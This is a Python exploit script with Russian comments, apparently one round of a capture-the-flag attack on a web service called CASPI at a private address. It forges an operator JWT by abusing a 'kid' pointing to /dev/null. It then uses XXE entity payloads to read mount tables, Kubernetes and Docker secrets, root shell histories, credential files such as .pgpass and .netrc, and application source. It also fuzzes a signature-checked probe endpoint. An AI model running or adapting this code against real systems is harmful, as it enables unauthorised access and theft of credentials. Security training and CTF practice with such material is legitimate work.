#!/usr/bin/env python3
"""round43 — Полный mounts, docker.sock, /tmp, /root, CSS secrets, больше путей"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

def xxe_read_full(path):
    """Читаем файл через ДВА поля для макс. длины"""
    st1, v1 = xxe_read(path, "remarks")
    st2, v2 = xxe_read(path, "carrier")
    if st1 == "OK":
        return st1, v1
    return st2, v2

# ============================================================
print("="*70)
print("PHASE 1: ПОЛНЫЙ /proc/self/mounts (ВСЕ 26 СТРОК)")
print("="*70)

st, val = xxe_read("/proc/self/mounts")
if st == "OK":
    lines = val.split('\n')
    print(f"  Всего строк: {len(lines)}")
    for i, line in enumerate(lines):
        print(f"  [{i:2d}] {line}")
        # Особенное внимание к volume маунтам
        if '/var/local' in line or '/secret' in line or '/key' in line or \
           '/config' in line or '/data' in line or '/probe' in line:
            print(f"       ^^^ ИНТЕРЕСНЫЙ МАУНТ ^^^")

# Также через carrier поле (может быть длиннее)
print("\n  --- через carrier поле ---")
st, val = xxe_read("/proc/self/mounts", "carrier")
if st == "OK":
    lines = val.split('\n')
    print(f"  Всего строк: {len(lines)}")
    for i, line in enumerate(lines[10:], 10):  # Только оставшиеся
        print(f"  [{i:2d}] {line}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: /proc/self/mountinfo (ДЕТАЛЬНАЯ ВЕРСИЯ)")
print("="*70)

st, val = xxe_read("/proc/self/mountinfo")
if st == "OK":
    lines = val.split('\n')
    print(f"  Всего строк: {len(lines)}")
    for line in lines:
        # Ищем volume маунты
        if '/var/local' in line or '/secret' in line or '/key' in line or \
           '/config' in line or '/data' in line or '/probe' in line or \
           '/flag' in line or 'volume' in line.lower():
            print(f"  >>> {line}")
        elif line.strip():
            # Показываем mount point (5-е поле)
            parts = line.split()
            if len(parts) > 4:
                mp = parts[4]
                print(f"  {mp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 3: DOCKER.SOCK И RUNTIME ФАЙЛЫ")
print("="*70)

docker_paths = [
    "/var/run/docker.sock",
    "/run/docker.sock",
    "/tmp/docker.sock",
    # containerd
    "/run/containerd/containerd.sock",
    # Kubernetes secrets
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    # Docker secrets (более подробно)
    "/run/secrets/probe_secret",
    "/run/secrets/PROBE_SECRET",
    "/run/secrets/probe",
    "/run/secrets/hmac",
    "/run/secrets/secret",
    "/run/secrets/app_secret",
    "/run/secrets/flask_secret",
    "/run/secrets/jwt_secret",
    "/run/secrets/db_password",
]

for fp in docker_paths:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"  [НАЙДЕН!] {fp}: '{val[:200]}'")
    elif st == "BIN":
        print(f"  [БИНАРНЫЙ] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: /tmp, /root, ИСТОРИЯ КОМАНД")
print("="*70)

history_paths = [
    "/root/.bash_history", "/root/.ash_history", "/root/.sh_history",
    "/root/.python_history", "/root/.psql_history",
    "/home/app/.bash_history", "/home/app/.ash_history",
    "/home/gunicorn/.bash_history",
    # tmp файлы
    "/tmp/env.txt", "/tmp/env", "/tmp/secret", "/tmp/probe",
    "/tmp/config", "/tmp/probe_secret", "/tmp/.env",
    "/tmp/flag", "/tmp/flag.txt",
    # root конфиги
    "/root/.pgpass", "/root/.my.cnf", "/root/.netrc",
    "/root/.bashrc", "/root/.profile",
    # PID файлы
    "/tmp/gunicorn.pid", "/var/run/gunicorn.pid",
    "/app/gunicorn.pid",
]

for fp in history_paths:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  [НАЙДЕН!] {fp}:")
        for line in val.split('\n')[:20]:
            print(f"    {line}")
    elif st == "BIN":
        print(f"  [БИНАРНЫЙ] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: CSS ФАЙЛ — ИЩЕМ СКРЫТЫЕ КОММЕНТАРИИ")
print("="*70)

try:
    r = requests.get(f"{CASPI}/static/css/app.css", timeout=10)
    if r.status_code == 200:
        import re
        # Ищем CSS комментарии
        comments = re.findall(r'/\*.*?\*/', r.text, re.DOTALL)
        if comments:
            print(f"  Найдено {len(comments)} CSS комментариев:")
            for c in comments:
                print(f"    {c[:200]}")
        # Ищем ключевые слова
        for kw in ["secret", "probe", "key", "flag", "KHS", "token", "password", "hmac"]:
            if kw.lower() in r.text.lower():
                for m in re.finditer(kw, r.text, re.IGNORECASE):
                    ctx = r.text[max(0,m.start()-30):m.start()+50]
                    print(f"  КЛЮЧЕВОЕ СЛОВО '{kw}': ...{ctx}...")
        print(f"  CSS длина: {len(r.text)} байт, комментариев: {len(comments)}")
    else:
        print(f"  [{r.status_code}]")
except Exception as e:
    print(f"  Ошибка: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 6: ЕЩЁ ПУТИ — /opt, /srv, /usr/local, /home")
print("="*70)

more_paths = [
    # /opt
    "/opt/app/config.json", "/opt/app/secrets", "/opt/probe_secret",
    "/opt/config", "/opt/secret", "/opt/keys/probe",
    # /srv
    "/srv/app/config.json", "/srv/app/probe_secret",
    # /usr/local
    "/usr/local/etc/probe_secret", "/usr/local/etc/app.conf",
    # /home
    "/home/app/probe_secret", "/home/app/.env",
    "/home/flask/probe_secret",
    # /etc файлы
    "/etc/app/config", "/etc/app/probe_secret",
    "/etc/default/caspiterminal",
    "/etc/environment",
    "/etc/profile.d/app.sh",
    # Альтернативные имена ключей
    "/app/keys/probe_secret", "/app/keys/gateway",
    "/app/keys/signing", "/app/keys/hmac_key",
    "/app/keys/admin", "/app/keys/secret",
    "/app/keys/device", "/app/keys/default",
    "/app/keys/app", "/app/keys/flask",
    "/app/keys/key", "/app/keys/sign",
]

for fp in more_paths:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"  [НАЙДЕН!] {fp}: '{val[:200]}'")
    elif st == "BIN":
        print(f"  [БИНАРНЫЙ] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 7: PROBE ENDPOINT — ПАРАМЕТРЫ И ОШИБКИ")
print("="*70)

# Пробуем разные Content-Type и форматы
probe_tests = [
    # Без sig
    ({"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"}, "без sig"),
    # sig=null
    ({"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow", "sig": None}, "sig=null"),
    # sig пустой
    ({"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow", "sig": ""}, "sig=''"),
    # sig=0
    ({"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow", "sig": "0"*64}, "sig=0*64"),
    # url пустой
    ({"url": "", "sig": "a"*64}, "url=''"),
    # Массив
    ({"url": ["http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"], "sig": "test"}, "url=array"),
    # Число
    ({"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow", "sig": 0}, "sig=0"),
    # Boolean
    ({"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow", "sig": True}, "sig=true"),
    # Дополнительные поля
    ({"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
      "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09",
      "key": ""}, "с key=''"),
    ({"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
      "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09",
      "secret": ""}, "с secret=''"),
    ({"url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
      "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09",
      "device": "lm-01"}, "с device"),
]

for payload, label in probe_tests:
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
            json=payload, headers=AUTH_OP, timeout=5)
        print(f"  [{r.status_code}] {label}: {r.text[:120]}")
    except Exception as e:
        print(f"  [ERR] {label}: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 8: SIGN ENDPOINT — ПОЛНЫЙ ОТВЕТ")
print("="*70)

# Полный дамп probe/sign для анализа
for device in ["lm-01", "tk-01"]:
    try:
        r = S.get(f"{CASPI}/api/ops/probe/sign",
            params={"device": device}, headers=AUTH_OP, timeout=5)
        print(f"\n  device={device}:")
        print(f"  Status: {r.status_code}")
        print(f"  Headers: {dict(r.headers)}")
        print(f"  Body: {r.text}")
    except Exception as e:
        print(f"  Error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 9: ПОПЫТКА ПРОЧИТАТЬ app.py ЧЕРЕЗ РАЗНЫЕ ENTITY ПОЗИЦИИ")
print("="*70)

# Что если app.py начинается с чистых строк (import, комментарии)
# и <, & появляется позже? lxml может вернуть частичный контент до ошибки?
# Тестируем: app.py в reference (короткое поле) vs carrier vs remarks
for field in ["reference", "carrier", "remarks"]:
    st, val = xxe_read("/app/app.py", field)
    print(f"  app.py через {field}: [{st}] '{val[:100] if val else ''}'")

# Пробуем auth.py тоже
for field in ["reference", "carrier", "remarks"]:
    st, val = xxe_read("/app/auth.py", field)
    print(f"  auth.py через {field}: [{st}] '{val[:100] if val else ''}'")

# ============================================================
print("\n"+"="*70)
print("PHASE 10: /etc/environment И SHELL ПРОФИЛИ")
print("="*70)

env_files = [
    "/etc/environment",
    "/etc/profile",
    "/etc/bash.bashrc",
    "/root/.bashrc",
    "/root/.profile",
    "/etc/profile.d/app.sh",
    "/etc/profile.d/probe.sh",
    "/etc/profile.d/env.sh",
    "/etc/sysconfig/app",
    "/etc/default/app",
]

for fp in env_files:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"\n  [НАЙДЕН!] {fp}:")
        for line in val.split('\n')[:15]:
            print(f"    {line}")
    elif st == "BIN":
        print(f"  [БИНАРНЫЙ] {fp}")

print("\n"+"="*70)
print("DONE")
print("="*70)
